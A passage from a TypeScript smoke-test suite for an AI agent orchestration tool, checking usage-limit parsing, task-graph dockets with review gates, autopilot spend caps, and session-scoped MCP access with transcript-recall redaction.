    check(parsedUsage.windows.every((w) => w.resetsAtText?.startsWith('Sep ') === true),
      'the provider’s own reset wording is kept verbatim, so a countdown is a bonus and never a dependency');

    // A second account with nothing spent on it prints the same three windows
    // with no reset clause at all. Requiring the clause read that account as a
    // format change — "Wanigan could not read a limit window out of the agent’s
    // reply" — on a reply that was perfectly well formed and said 0%.
    const freshAccountReply = [
      'You are currently using your subscription to power your Claude Code usage',
      '',
      'Current session: 0% used',
      'Current week (all models): 0% used',
      'Current week (Fable): 0% used',
      '',
      "What's contributing to your limits usage?",
      '',
      'Last 24h · 18 requests · 1 session',
      '  59% of your usage was at >150k context',
    ].join('\n');
    const fresh = claudeLimits.__test.parseUsage(freshAccountReply);
    check(fresh.windows.length === 3
      && fresh.windows.every((w) => w.usedPercent === 0)
      && fresh.windows.every((w) => w.resetsAtText === null && w.resetsAt === null)
      && fresh.windows[2].scope === 'Fable'
      && fresh.factors.length === 1 && fresh.factors[0].requests === 18,
      'a window with nothing used yet names no reset, and parses as 0% rather than as an unreadable reply',
      fresh.windows);
    check(parsedUsage.factors.length === 2
      && parsedUsage.factors[0].requests === 2857 && parsedUsage.factors[0].sessions === 7
      && parsedUsage.factors[0].lines.length === 2
      && parsedUsage.factors[1].requests === 17032,
      'the contributing blocks parse with their counts, including a thousands separator', parsedUsage.factors);
    check(parsedUsage.plan === 'subscription',
      'the plan wording is picked up from the provider’s own first line', parsedUsage.plan);

    check(claudeLimits.__test.parseUsage('command not found: claude').windows.length === 0
      && claudeLimits.__test.parseUsage('').windows.length === 0,
      'unrecognised output yields no windows, so the caller reports it as unreadable rather than as zero used');

    // A reset is always near, so the only inference worth making is the year
    // the provider omitted.
    const marNow = new Date(2026, 2, 1, 12, 0, 0).getTime();
    const soon = claudeLimits.__test.parseResetAt('Mar 3 at 8:59pm (America/Chicago)', marNow);
    check(soon !== null && soon > marNow && soon - marNow < 3 * 86_400_000,
      'a reset a couple of days out parses to that moment in the current year');
    const nextYear = claudeLimits.__test.parseResetAt('Jan 2 at 1:00am (America/Chicago)', new Date(2026, 11, 28).getTime());
    check(nextYear !== null && nextYear > new Date(2026, 11, 28).getTime(),
      'a reset date the provider printed without a year rolls into next year when this year would be far past');
    const onTheHour = claudeLimits.__test.parseResetAt('Sep 6 at 9pm (America/Chicago)', new Date(2026, 8, 4).getTime());
    check(onTheHour !== null && new Date(onTheHour).getHours() === 21 && new Date(onTheHour).getMinutes() === 0,
      'a reset printed on the hour as "9pm", with no minutes, still parses — a runtime probe caught this returning null');
    check(claudeLimits.__test.parseResetAt('whenever it feels like it') === null,
      'an unparseable reset time is null, and the verbatim text carries the answer instead');

    // Consumption is Wanigan's own record and must key to the account that ran.
    // `.every` over an empty array is true, so this used to pass on a database
    // with no recorded consumption — which is every fresh install, including
    // this suite's. The rows are seeded first so the shape is actually read.
    const usageSeedAt = Date.now();
    // consumption() joins session_log for the account, so the session row has
    // to exist or the event is invisible to the very query under test.
    db().prepare(`
      INSERT OR IGNORE INTO session_log (id, provider_id, project_id, project_name, project_path, started_at)
      VALUES ('smoke-usage', 'test', 'p', 'p', '/tmp/p', ?)
    `).run(usageSeedAt);
    const seedApiEvent = db().prepare(`
      INSERT INTO session_api_events (session_id, at, kind, model, in_tokens, out_tokens, cost_usd)
      VALUES ('smoke-usage', ?, 'request', ?, 10, 20, ?)
    `);
    seedApiEvent.run(usageSeedAt, 'smoke-priced-model', 0.5);
    seedApiEvent.run(usageSeedAt, 'smoke-silent-model', 0);
    const usageRows = usageAgg.consumption(7);
    check(usageRows.length > 0 && usageRows.every((row) => typeof row.accountLabel === 'string'
      && ['reported', 'partial', 'unreported'].includes(row.costStatus)),
      'recorded consumption is grouped per account and model, and says whether its cost figure is complete',
      `${usageRows.length} rows`);
    check(usageRows.find((row) => row.model === 'smoke-silent-model')?.costStatus === 'unreported'
      && usageRows.find((row) => row.model === 'smoke-priced-model')?.costStatus === 'reported',
      'a model whose requests carried no cost is labelled unreported rather than totalled as free');
    db().prepare("DELETE FROM session_api_events WHERE session_id='smoke-usage'").run();
    db().prepare("DELETE FROM session_log WHERE id='smoke-usage'").run();

    // ── P31 · a docket is a graph ────────────────────────────────────────
    // Two implement branches off one plan, each with its own verification, and
    // a single review that both reach. This is the shape a planner proposes;
    // everything below asserts it is safe to write and safe to finish.
    const fanPlan: DocketPlanNode[] = [
      { kind: 'plan', title: 'Scope both branches', instructions: 'Split the work.', dependsOn: [] },
      { kind: 'implement', title: 'Branch A', instructions: 'Own src/a.', dependsOn: [0], claimPath: 'src/a' },
      { kind: 'implement', title: 'Branch B', instructions: 'Own src/b.', dependsOn: [0], claimPath: 'src/b' },
      // Shares Branch A's path, but runs after it — a handover, not a conflict.
      { kind: 'verify', title: 'Verify A', instructions: 'Gate branch A.', dependsOn: [1], claimPath: 'src/a' },
      { kind: 'verify', title: 'Verify B', instructions: 'Gate branch B.', dependsOn: [2] },
      { kind: 'review', title: 'Decide', instructions: 'Read both branches.', dependsOn: [3, 4] },
    ];
    const fan = control.createDocket({ projectId: controlProject.id, title: 'Fan-out smoke',
      objective: 'Prove a docket can hold a real task graph.', acceptance: ['Both branches are verified.'], plan: fanPlan });
    const byTitle = (detail: typeof fan, title: string) => detail.nodes.find((node) => node.title === title)!;
    check(fan.nodes.length === 6 && byTitle(fan, 'Scope both branches').status === 'ready'
      && byTitle(fan, 'Branch A').status === 'blocked' && byTitle(fan, 'Branch B').status === 'blocked',
      'a proposed task graph is written as a real dependency graph, not a fixed four-step chain');
    check(byTitle(fan, 'Branch A').claimPath === 'src/a' && byTitle(fan, 'Scope both branches').claimPath === null,
      'a planned path claim is stored per task and absent when none was declared');

    const rejectedPlan = (plan: unknown, label: string) => {
      try {
        control.createDocket({ projectId: controlProject.id, title: label, objective: label, acceptance: ['n/a'], plan: plan as DocketPlanNode[] });
        return false;
      } catch { return true; }
    };
    check(rejectedPlan([
      { kind: 'implement', title: 'A', instructions: 'x', dependsOn: [1] },
      { kind: 'implement', title: 'B', instructions: 'x', dependsOn: [0] },
      { kind: 'review', title: 'R', instructions: 'x', dependsOn: [0, 1] },
    ], 'Cycle'), 'a cyclic task graph is refused instead of being written as permanently blocked work');
    check(rejectedPlan([
      { kind: 'implement', title: 'A', instructions: 'x', dependsOn: [] },
    ], 'No review'), 'a task graph without a review task is refused; the human decision is the final gate');
    check(rejectedPlan([
      { kind: 'implement', title: 'Reviewed', instructions: 'x', dependsOn: [] },
      { kind: 'implement', title: 'Unreviewed', instructions: 'x', dependsOn: [] },
      { kind: 'review', title: 'R', instructions: 'x', dependsOn: [0] },
    ], 'Unreachable'), 'a task the review cannot reach is refused rather than accepted unreviewed');
    check(rejectedPlan([
      { kind: 'implement', title: 'A', instructions: 'x', dependsOn: [], claimPath: 'src' },
      { kind: 'implement', title: 'B', instructions: 'x', dependsOn: [], claimPath: 'src/nested' },
      { kind: 'review', title: 'R', instructions: 'x', dependsOn: [0, 1] },
    ], 'Concurrent claims'), 'two tasks that can run at once cannot claim overlapping paths');

    control.completeNode(byTitle(fan, 'Scope both branches').id, { detail: 'Split.' });
    const afterPlan = control.docket(fan.id);
    check(byTitle(afterPlan, 'Branch A').status === 'ready' && byTitle(afterPlan, 'Branch B').status === 'ready',
      'completing one prerequisite releases every dependent branch at once, which is what fan-out is for');
    control.completeNode(byTitle(afterPlan, 'Branch A').id, { detail: 'A done.' });
    control.completeNode(byTitle(afterPlan, 'Branch B').id, { detail: 'B done.' });
    const verifyA = byTitle(control.docket(fan.id), 'Verify A');
    const verifyB = byTitle(control.docket(fan.id), 'Verify B');
    let unprovenVerifyRefused = false;
    try { control.completeNode(verifyB.id, { detail: 'Trust me.' }); } catch { unprovenVerifyRefused = true; }
    check(unprovenVerifyRefused, 'a verification task still cannot be completed without command evidence');
    await control.runProof(verifyA.id); control.completeNode(verifyA.id, { detail: 'A gate passed.' });
    await control.runProof(verifyB.id); control.completeNode(verifyB.id, { detail: 'B gate passed.' });
    const decide = byTitle(control.docket(fan.id), 'Decide');
    check(decide.status === 'ready', 'the review task becomes ready only once every branch has completed');
    // A later red run on one branch must outvote both earlier greens.
    review.saveRecipe(controlProject.id, ['false']);
    await control.runProof(verifyB.id);
    review.saveRecipe(controlProject.id, ['true']);
    let partialApprovalRefused = false;
    try { control.completeNode(decide.id, { decision: 'approve', detail: 'Looks fine.' }); } catch { partialApprovalRefused = true; }
    check(partialApprovalRefused,
      'one green branch cannot approve a docket whose other branch last failed its gate');
    await control.runProof(verifyB.id);
    control.completeNode(decide.id, { decision: 'approve', detail: 'Both branches verified.' });
    check(control.docket(fan.id).status === 'accepted',
      'a fanned-out docket is accepted once every verification task holds a passing proof');

    // ── P31 · autopilot dispatch ─────────────────────────────────────────
    // The sweep writes queue rows; it never launches anything itself. These
    // assertions run it directly, because the timer that normally calls it is
    // off under smoke — it would start real provider sessions mid-suite.
    const autoPlan: DocketPlanNode[] = [
      { kind: 'implement', title: 'Auto A', instructions: 'Own auto/a.', dependsOn: [], claimPath: 'auto/a' },
      { kind: 'implement', title: 'Auto B', instructions: 'Own auto/b.', dependsOn: [], claimPath: 'auto/b' },
      { kind: 'verify', title: 'Auto verify', instructions: 'Gate both.', dependsOn: [0, 1] },
      { kind: 'review', title: 'Auto review', instructions: 'Decide.', dependsOn: [2] },
    ];
    const unbudgeted = control.createDocket({ projectId: controlProject.id, title: 'Unbudgeted',
      objective: 'Autopilot without a cap.', acceptance: ['Refused.'], plan: autoPlan });
    let uncappedRefused = false;
    try { control.setAutopilot(unbudgeted.id, { enabled: true, providerId: 'claude' }); } catch { uncappedRefused = true; }
    check(uncappedRefused && !control.docket(unbudgeted.id).autopilot.enabled,
      'unattended dispatch without a spend cap is refused rather than started');

    const auto = control.createDocket({ projectId: controlProject.id, title: 'Autopilot smoke',
      objective: 'Dispatch ready work without an operator.', acceptance: ['Both branches land.'],
      budgetUsd: 5, plan: autoPlan });
    const armed = control.setAutopilot(auto.id, { enabled: true, providerId: 'claude', model: 'smoke-model' });
    check(armed.autopilot.enabled && armed.autopilot.providerId === 'claude' && armed.autopilot.model === 'smoke-model'
      && armed.autopilot.budgetUsd === 5 && armed.autopilot.spendStatus === 'none',
      'arming autopilot freezes the provider, model and cap it will dispatch against');

    // ── P8 · a reopened task keeps its spend inside the goal ──────────────
    // work_nodes.session_id is a live pointer and retryNode is the one
    // statement in main that nulls it. Before work_node_sessions, the money a
    // failed task had already spent left the cap the moment somebody reopened
    // it — the sweep would then dispatch the goal again on the strength of
    // cost it had already incurred, and the card kept saying every session had
    // reported while the figure beside it was short by exactly that task.
    // Seeded through the database rather than by launching an agent: a real
    // dispatch here would start a paid session mid-suite.
    const spent = control.createDocket({ projectId: controlProject.id, title: 'Reopen keeps the spend',
      objective: 'A task that spent money is reopened.', acceptance: ['The cap still knows.'],
      budgetUsd: 5, plan: autoPlan });
    const spentNode = spent.nodes.find((node) => node.title === 'Auto A')!;
    db().prepare("UPDATE work_nodes SET status='failed',session_id='sess_p8_spent' WHERE id=?").run(spentNode.id);
    db().prepare(`INSERT OR REPLACE INTO session_metrics (session_id,metric,attrs,value,last_at)
      VALUES ('sess_p8_spent','claude_code.cost.usage','',4.2,?)`).run(Date.now());
    const spendBeforeReopen = control.docket(spent.id).autopilot;
    control.retryNode(spentNode.id);
    const spendAfterReopen = control.docket(spent.id).autopilot;
    check(Math.abs(spendBeforeReopen.spendUsd - 4.2) < 1e-6
      && Math.abs(spendAfterReopen.spendUsd - 4.2) < 1e-6
      && spendAfterReopen.spendStatus === 'reported',
      'reopening a failed task leaves every dollar it already spent inside its goal, because retryNode records the session in work_node_sessions before it drops the pointer on the task row',
      { before: spendBeforeReopen, after: spendAfterReopen });

    // The negative. A goal that has launched a session may never report that
    // it has launched none, however many of its tasks were reopened — that is
    // the sentence the Control card and the phone both render from this field.
    db().prepare("UPDATE work_nodes SET session_id=NULL WHERE docket_id=?").run(spent.id);
    const spendWithNoPointers = control.docket(spent.id).autopilot;
    check(spendWithNoPointers.spendStatus !== 'none'
      && Math.abs(spendWithNoPointers.spendUsd - 4.2) < 1e-6,
      'a goal whose tasks no longer point at any session still reports the spend of the sessions it launched, and never falls back to the "no session has been launched" reading it would have to have read a row to earn',
      spendWithNoPointers);

    // The recorded set is append-only and idempotent, which is what lets both
    // dispatch and retryNode write the same pair without either checking first.
    // Reopening the same task under the same session is the cheapest way to
    // make both writers land on one pair; retryNode refuses a task that is not
    // failed or canceled, so the status goes back with the pointer.
    db().prepare("UPDATE work_nodes SET status='failed',session_id='sess_p8_spent' WHERE id=?").run(spentNode.id);
    control.retryNode(spentNode.id);
    const spentRows = db().prepare(
      "SELECT COUNT(*) n FROM work_node_sessions WHERE node_id=? AND session_id='sess_p8_spent'"
    ).get(spentNode.id) as { n: number };
    check(spentRows.n === 1,
      'recording the same task and session twice leaves one row, so a re-dispatch onto a session a task already ran under cannot double-count that session against the cap',
      spentRows.n);

    // Status and dollars must come from one set. If they ever drift apart the
    // card asserts "every session reported" over a set that lost a member,
    // which is the shape of the bug this phase exists to close.
    db().prepare("UPDATE work_nodes SET status='failed',session_id='sess_p8_quiet' WHERE id=?").run(spentNode.id);
    control.retryNode(spentNode.id);
    const spendMixed = control.docket(spent.id).autopilot;
    check(spendMixed.spendStatus === 'reported' && Math.abs(spendMixed.spendUsd - 4.2) < 1e-6,
      'a second recorded session that named no cost is still counted as a member of the set the status is decided over, so spendUsd and spendStatus can never be computed from different populations',
      spendMixed);

    // Source contract, because the query is the fix. A future edit that reads
    // work_nodes.session_id alone reintroduces the whole defect silently: the
    // numbers stay plausible and only shrink when somebody presses Reopen.
    const controlSrcP8 = sourceOf('src/main/control.ts');
    check(controlSrcP8.includes('UNION SELECT session_id FROM work_node_sessions WHERE docket_id=?')
      && controlSrcP8.includes('recordNodeSession(nodeId, node.docket_id, node.session_id);')
      && controlSrcP8.includes('recordNodeSession(nodeId, parent.id, session.id);')
      && !/const sessions = \(db\(\)\.prepare\("SELECT session_id FROM work_nodes WHERE docket_id=\? AND session_id IS NOT NULL"\)/.test(controlSrcP8),
      'a goal’s spend is read from the union of its live session pointers and the sessions work_node_sessions has recorded for its tasks, both dispatch and reopen write that record, and the single-table read that let a reopened task refund its own spend is gone',
      controlSrcP8.slice(controlSrcP8.indexOf('function autopilotSpend'), controlSrcP8.indexOf('function autopilotSpend') + 300));

    const swept = control.sweepAutopilot();
    const queuedLabels = queue.listQueue(200).filter((item) => item.kind === 'node').map((item) => item.label);
    check(swept === 2 && queuedLabels.filter((label) => label.startsWith('Autopilot smoke · ')).length === 2,
      'the sweep queues every ready branch at once, and only the ready ones', { swept, queuedLabels });
    check(!queuedLabels.some((label) => label.includes('Auto review')),
      'the review task is never dispatched to an agent; approving its own docket is the gate autopilot must not cross');
    check(control.sweepAutopilot() === 0,
      'a second sweep re-queues nothing, so a task cannot be started twice by two ticks');

    // Turning autopilot off cannot un-queue a row a runner may already hold, so
    // the runner itself is the thing that has to refuse.
    control.setAutopilot(auto.id, { enabled: false });
    const autoA = control.docket(auto.id).nodes.find((node) => node.title === 'Auto A')!;
    await control.startQueuedNode(autoA.id);
    check(control.docket(auto.id).nodes.find((node) => node.id === autoA.id)?.status === 'ready',
      'a queued task whose autopilot was switched off returns without starting a paid session');
    check(control.sweepAutopilot() === 0,
      'a disarmed docket is skipped by later sweeps, so switching autopilot off actually stops it');
    for (const item of queue.listQueue(200).filter((row) => row.kind === 'node')) queue.cancelQueued(item.id);

    const capped = control.createDocket({ projectId: controlProject.id, title: 'Spent out',
      objective: 'A cap already reached.', acceptance: ['Halts.'], budgetUsd: 0, plan: autoPlan });
    control.setAutopilot(capped.id, { enabled: true, providerId: 'claude' });
    check(control.sweepAutopilot() === 0 && !control.docket(capped.id).autopilot.enabled,
      'a docket at its cap stops dispatching instead of continuing on unreported cost');
    check(control.docket(capped.id).proofs.some((proof) => proof.summary.startsWith('Autopilot stopped:')),
      'the halt is written into the docket’s own evidence, not just a flipped flag');
    const haltState = control.docket(capped.id).autopilot;
    check(haltState.haltedReason !== null && haltState.haltedReason.includes('budget')
      && !haltState.haltedReason.startsWith('Autopilot stopped')
      && (haltState.haltedAt ?? 0) > 0,
      'the halt reason reaches a surface as a typed field with its prefix already stripped, so no view has to parse a summary sentence to say why dispatch stopped',
      haltState);

    // A cap cannot be pulled out from under an armed docket. The sweep would
    // otherwise find budget_usd null on its next tick and halt the run
    // somewhere nobody was looking, so the refusal happens where the operator
    // is standing instead.
    control.setAutopilot(capped.id, { enabled: true, providerId: 'claude' });
    let budgetRemovalRefused = false;
    try { control.setDocketBudget(capped.id, null); } catch { budgetRemovalRefused = true; }
    check(budgetRemovalRefused && control.docket(capped.id).autopilot.budgetUsd === 0,
      'a spend cap cannot be removed while autopilot is armed; disarming stays a separate, deliberate decision');
    control.setAutopilot(capped.id, { enabled: false });
    check(control.setDocketBudget(capped.id, null).autopilot.budgetUsd === null,
      'the same cap comes off once autopilot is disarmed, so the refusal is a sequence and not a dead end');

    // Without this the earlier uncapped refusal was unrecoverable: nothing
    // could give a goal a budget after the insert, so a goal created without
    // one could never arm autopilot at all.
    const funded = control.setDocketBudget(unbudgeted.id, 3);
    const armedAfterFunding = control.setAutopilot(unbudgeted.id, { enabled: true, providerId: 'claude' }).autopilot.enabled;
    control.setAutopilot(unbudgeted.id, { enabled: false });
    check(funded.budgetUsd === 3 && funded.autopilot.budgetUsd === 3 && armedAfterFunding,
      'a goal created without a cap can be given one afterwards, which is the only route it has to ever arm autopilot',
      { budgetUsd: funded.budgetUsd, armedAfterFunding });
    let badBudgetRefused = false;
    try { control.setDocketBudget(unbudgeted.id, 1_000_000); } catch { badBudgetRefused = true; }
    check(badBudgetRefused && control.docket(unbudgeted.id).autopilot.budgetUsd === 3,
      'an out-of-range cap is refused and leaves the previous one standing, rather than half-writing a budget autopilot would spend against');

    const event = control.addEvent({ projectId: controlProject.id, source: 'ci', kind: 'failure', summary: 'Smoke CI failed.' });
    const triaged = control.triageEvent(event.id, {});
    check(control.listEvents('triaged').some((item) => item.docketId === triaged.id),
      'event triage creates a durable docket without automatically starting an agent');
    const tasks = control.mcpTasks(docket.id);
    check(tasks.length === 4 && tasks.some((task) => task.status === 'completed'),
      'docket nodes expose durable MCP-compatible task lifecycle state');
    // cancelMcpTask returned a bare boolean, so Control announced the same
    // sentence whether it had killed a live agent or found nothing at all.
    // These four pin one branch each, because the whole point of the receipt is
    // that the branches are not the same event.
    const cancelGoal = control.createDocket({ projectId: controlProject.id, title: 'Cancel receipt',
      objective: 'Prove cancel reports what it changed.', acceptance: ['Every branch names itself.'] });
    const cancelNode = cancelGoal.nodes.find((node) => node.kind === 'implement')!;
    control.claimPath(cancelNode.id, 'tmp/cancel-receipt-smoke.ts');
    const cancelRecord = control.mcpTasks(cancelGoal.id).find((task) => task.nodeId === cancelNode.id)!;
    const cancelled = control.cancelMcpTask(cancelRecord.id);
    check(cancelled.outcome === 'task_canceled' && cancelled.nodeStatus === 'pending'
      && cancelled.sessionStopped === false && cancelled.claimsReleased === 1
      && control.docket(cancelGoal.id).claims.every((claim) => claim.releasedAt !== null),
      'cancelling a task that was never dispatched reports the one claim it really released and refuses to say a session was stopped, because no session was ever launched for it',
      cancelled);

    check(control.cancelMcpTask(cancelRecord.id).outcome === 'already_closed'
      && control.cancelMcpTask(cancelRecord.id).recordStatus === 'cancelled'
      && control.cancelMcpTask(cancelRecord.id).claimsReleased === 0,
      'cancelling the same record a second time says it was already cancelled and releases nothing again, instead of repeating the success the first call earned');

    const missingCancel = control.cancelMcpTask('task_no_such_record');
    check(missingCancel.outcome === 'not_found' && missingCancel.recordStatus === null
      && missingCancel.nodeStatus === null && missingCancel.sessionStopped === false
      && missingCancel.claimsReleased === 0,
      'an id that names no task record comes back as not_found with nothing read and nothing written, rather than as the indistinguishable false success a boolean gave it',
      missingCancel);

    const endedGoal = control.createDocket({ projectId: controlProject.id, title: 'Cancel after the end',
      objective: 'A record still open over work that already finished.', acceptance: ['Only the record moves.'] });
    const endedNode = endedGoal.nodes.find((node) => node.kind === 'plan')!;
    db().prepare("UPDATE work_nodes SET status='completed' WHERE id=?").run(endedNode.id);
    const endedRecord = control.mcpTasks(endedGoal.id).find((task) => task.nodeId === endedNode.id)!;
    const endedCancel = control.cancelMcpTask(endedRecord.id);
    check(endedCancel.outcome === 'record_only' && endedCancel.nodeStatus === 'completed'
      && endedCancel.sessionStopped === false && endedCancel.claimsReleased === 0
      && control.mcpTasks(endedGoal.id).find((task) => task.id === endedRecord.id)?.status === 'cancelled'
      && control.docket(endedGoal.id).nodes.find((node) => node.id === endedNode.id)?.status === 'completed',
      'cancelling a record whose task had already finished marks the record alone and reports that: the goal task is still completed afterwards and no claim was touched',
      endedCancel);
    check(tasks.length === 4 && tasks.some((task) => task.status === 'completed'),
      'docket nodes expose durable MCP-compatible task lifecycle state');
    const receiptSession = `s_receipt_${Date.now().toString(36)}`;
    const receiptConversation = '01a04e58-e0eb-7a41-82b7-ddcacf7a9038';
    db().prepare(`INSERT INTO session_log (id,conversation_id,provider_id,project_id,project_path,project_name,started_at)
      VALUES (?,?,?,?,?,?,?)`).run(receiptSession, receiptConversation, 'codex', controlProject.id, controlRepo, 'control', Date.now());
    db().prepare('UPDATE work_nodes SET session_id=? WHERE id=?').run(receiptSession, planNode.id);
    db().prepare(`INSERT INTO work_resume_receipts
      (node_id,docket_id,session_id,conversation_id,provider_id,model,base_commit,worktree,created_at,updated_at)
      VALUES (?,?,?,?,?,?,?,?,?,?)`).run(planNode.id, docket.id, receiptSession, null, 'codex', 'smoke', docket.baseCommit, controlRepo, Date.now(), Date.now());
    const receipt = control.resumeReceipts(docket.id).find((row) => row.nodeId === planNode.id);
    check(receipt?.state === 'exact' && receipt.conversationId === receiptConversation,
      'a Goal recovery receipt refreshes the exact durable conversation before offering resume', receipt);
    recordGoalTrace({ sessionId: receiptSession, source: 'hook', kind: 'PostToolUse', status: 'recorded', toolName: 'Read',
      summary: 'README.md', durationMs: 12, costUsd: 0, inTokens: 0, outTokens: 0 });
    check(listGoalTrace(docket.id).some((trace) => trace.sessionId === receiptSession && trace.toolName === 'Read'),
      'content-free hook evidence is correlated to its durable Goal task');
    const goalMcp = await mcpServer.startMcpServer();
    const otherSession = `s_other_${Date.now().toString(36)}`;
    db().prepare(`INSERT INTO session_log (id,conversation_id,provider_id,project_id,project_path,project_name,started_at)
      VALUES (?,?,?,?,?,?,?)`).run(otherSession, null, 'codex', controlProject.id, controlRepo, 'control', Date.now());
    const ownConfig = mcpRegistry.writeMcpConfig(controlProject.id, controlRepo, receiptSession);
    const otherConfig = mcpRegistry.writeMcpConfig(controlProject.id, controlRepo, otherSession);
    const capability = (file: string | null) => {
      if (!file) return '';
      const parsed = JSON.parse(fs.readFileSync(file, 'utf8')) as { mcpServers?: { wanigan?: { headers?: { Authorization?: string; 'X-Wanigan-Session'?: string } } } };
      return parsed.mcpServers?.wanigan?.headers?.Authorization?.replace(/^Bearer\s+/, '') ?? '';
    };
    const ownToken = capability(ownConfig);
    const otherToken = capability(otherConfig);
    const rpc = async (token: string, method: string, params: Record<string, unknown> = {}, spoofedSessionId?: string) => {
      const response = await fetch(goalMcp.url, { method: 'POST', headers: {
        'content-type': 'application/json', authorization: `Bearer ${token}`,
        ...(spoofedSessionId ? { 'x-wanigan-session': spoofedSessionId } : {}),
      }, body: JSON.stringify({ jsonrpc: '2.0', id: 1, method, params }) });
      return { status: response.status, body: await response.json() as { result?: any } };
    };
    try {
      check(ownConfig !== null && otherConfig !== null && ownConfig !== otherConfig,
        'concurrent sessions receive separate MCP config files');
      check(ownToken.length > 40 && otherToken.length > 40 && ownToken !== otherToken,
        'each generated MCP config carries a distinct opaque session capability');
      if (ownConfig) {
        const ownJson = fs.readFileSync(ownConfig, 'utf8');
        check(!ownJson.includes('X-Wanigan-Session') && (fs.statSync(ownConfig).mode & 0o077) === 0,
          'MCP configs do not expose a forgeable session header and remain owner-readable only');
      }
      check(!('token' in goalMcp), 'MCP server status returned to callers contains no bearer token');
      const listedTools = await rpc(ownToken, 'tools/list');
      check(listedTools.body.result?.tools?.some((tool: { name?: string }) => tool.name === 'wanigan_get_goal'),
        'Wanigan MCP advertises durable Goal tools to supported sessions');
      // Transcript recall: off by default, listed only after the project opts
      // in, scoped to the caller's frozen harness/backend/account, redacted.
      const hasRecall = (body: { result?: any }) => Boolean(body.result?.tools?.some((tool: { name?: string }) => tool.name === 'wanigan_recall_transcripts'));
      check(!transcripts.recallEnabled(controlProject.id) && !hasRecall(listedTools.body),
        'transcript recall is off by default and an un-opted-in project never sees the tool listed');
      const blindCall = await rpc(ownToken, 'tools/call', { name: 'wanigan_recall_transcripts', arguments: { query: 'anything' } });
      check(blindCall.body.result?.isError === true, 'calling recall without the opt-in is refused, not answered');
      transcripts.setRecallEnabled(controlProject.id, true);
      const recallSession = `s_recall_${Date.now().toString(36)}`;
      const foreignSession = `${recallSession}_other_account`;
      const recallInsert = db().prepare(`INSERT INTO session_log (id,provider_id,harness_id,backend_id,account_id,project_id,project_path,project_name,started_at,title)
        VALUES (?,?,?,?,?,?,?,?,?,?)`);
      recallInsert.run(recallSession, 'claude', 'claude-code', 'anthropic', null, controlProject.id, controlRepo, 'control', Date.now(), 'Recall me');
      recallInsert.run(foreignSession, 'claude', 'claude-code', 'anthropic', 'acct_someone_else', controlProject.id, controlRepo, 'control', Date.now(), 'Not yours');
      const archiveInsert = db().prepare('INSERT INTO transcripts (session_id, source_path, stored_path, bytes, turns, parsed, archived_at) VALUES (?,?,?,?,?,?,?)');
      archiveInsert.run(recallSession, '/dev/null', '/dev/null', 1, 1, 1, Date.now());
      archiveInsert.run(foreignSession, '/dev/null', '/dev/null', 1, 1, 1, Date.now());
      const ftsInsert = db().prepare('INSERT INTO transcript_fts (session_id, role, at, text) VALUES (?,?,?,?)');
      ftsInsert.run(recallSession, 'assistant', Date.now(), 'The heron migration key is sk-ant-0123456789abcdef and the plan is in docs/heron.md');
      ftsInsert.run(foreignSession, 'assistant', Date.now(), 'heron notes that belong to another account');
      try {
        check(hasRecall((await rpc(ownToken, 'tools/list')).body), 'after the operator opts the project in, the recall tool is listed');
        const codexRecall = await rpc(ownToken, 'tools/call', { name: 'wanigan_recall_transcripts', arguments: { query: 'heron' } });
        check(codexRecall.body.result?.structuredContent?.recall?.kind === 'unsupported'
          && /no archive/.test(codexRecall.body.result?.structuredContent?.recall?.note ?? ''),
        'a Codex-harness caller is told there is no archive for its harness instead of being shown an empty list', codexRecall.body.result);
        const scoped = transcripts.recallTranscripts(
          { projectId: controlProject.id, harnessId: 'claude-code', providerId: 'claude', backendId: 'anthropic', accountId: null }, 'heron', 10);
        check(scoped.kind === 'ok' && scoped.archivedSessions === 1 && scoped.hits.length === 1 && scoped.hits[0].sessionId === recallSession
          && scoped.hits[0].title === 'Recall me',
        'recall answers only from the caller’s project, frozen backend and frozen account — another account’s archive is out of scope', scoped);
        check(scoped.kind === 'ok' && !scoped.hits[0].snippet.includes('sk-ant-0123456789abcdef') && /heron/.test(scoped.hits[0].snippet),
          'recalled snippets pass through credential redaction', scoped.kind === 'ok' ? scoped.hits[0].snippet : scoped);
        const otherBackend = transcripts.recallTranscripts(
          { projectId: controlProject.id, harnessId: 'claude-code', providerId: 'glm', backendId: 'zai', accountId: null }, 'heron', 10);
        check(otherBackend.kind === 'ok' && otherBackend.archivedSessions === 0 && otherBackend.hits.length === 0,
          'a different model backend in the same project sees none of these transcripts');
        transcripts.setRecallEnabled(controlProject.id, false);
        check(!hasRecall((await rpc(ownToken, 'tools/list')).body)
          && transcripts.recallTranscripts({ projectId: controlProject.id, harnessId: 'claude-code', providerId: 'claude', backendId: 'anthropic', accountId: null }, 'heron').kind === 'disabled',
        'switching recall off delists the tool and the reader itself answers disabled');
      } finally {
        transcripts.setRecallEnabled(controlProject.id, false);
        db().prepare('DELETE FROM transcript_fts WHERE session_id IN (?,?)').run(recallSession, foreignSession);
        db().prepare('DELETE FROM transcripts WHERE session_id IN (?,?)').run(recallSession, foreignSession);
        db().prepare('DELETE FROM session_log WHERE id IN (?,?)').run(recallSession, foreignSession);
      }
      const readGoal = await rpc(ownToken, 'tools/call', { name: 'wanigan_get_goal', arguments: { goalId: docket.id } });
      check(readGoal.body.result?.structuredContent?.goal?.id === docket.id,
        'Wanigan MCP returns a Goal contract as structured content');
      const ownCheckpoint = await rpc(ownToken, 'tools/call', { name: 'wanigan_goal_checkpoint', arguments: { nodeId: planNode.id, note: 'MCP checkpoint.' } }, otherSession);
      check(ownCheckpoint.body.result?.structuredContent?.checkpoint?.nodeId === planNode.id,
        'the owning capability still works when a forged session header is supplied');
      const deniedClaim = await rpc(otherToken, 'tools/call', { name: 'wanigan_goal_claim', arguments: { nodeId: planNode.id, path: 'other.ts' } }, receiptSession);
      check(deniedClaim.body.result?.isError === true,
        'another valid session capability cannot mutate this session’s Goal task');
      const resource = await rpc(ownToken, 'resources/read', { uri: 'ui://wanigan/goal-inspector' });
      check(typeof resource.body.result?.contents?.[0]?.text === 'string',
        'the Goal inspector MCP App resource is available without network access');
      db().prepare('UPDATE session_log SET ended_at=? WHERE id=?').run(Date.now(), receiptSession);
      const expired = await rpc(ownToken, 'ping');
      check(expired.status === 401, 'an ended session’s MCP capability is rejected even if its config remains on disk');
    } finally {
      mcpRegistry.cleanupMcpConfig(ownConfig, receiptSession);
      mcpRegistry.cleanupMcpConfig(otherConfig, otherSession);
      mcpServer.stopMcpServer();
    }
  } catch (error) {
    check(false, `durable work control suite threw: ${error instanceof Error ? error.message : String(error)}`);
  }

  /* ── wiring this smoke cannot call ─────────────────────────────────── */
  // startServices() never runs under WANIGAN_SMOKE and there is no renderer to
